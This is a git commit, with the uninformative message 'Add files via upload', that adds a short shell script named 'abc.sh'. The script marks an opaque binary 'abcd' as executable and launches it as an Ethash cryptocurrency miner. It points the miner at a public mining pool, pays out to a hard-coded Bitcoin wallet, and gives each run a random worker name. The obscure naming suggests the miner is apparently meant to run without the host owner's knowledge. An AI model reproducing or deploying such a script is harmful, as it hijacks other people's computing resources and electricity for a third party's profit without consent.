8cd8f8e097eaca0f32610a427b1160f14955ff8e
Z0R069 <87195439+Z0R069@users.noreply.github.com>
2021-07-09 20:36:39 +0530

    Add files via upload

---
+++ abc.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=BTC:bc1qzmqelgtaw5gq9k3a5ee2euwy0xegdydutdsfp2
+WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-USER1#bdfc-cm6i)
+chmod +x abcd
+./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
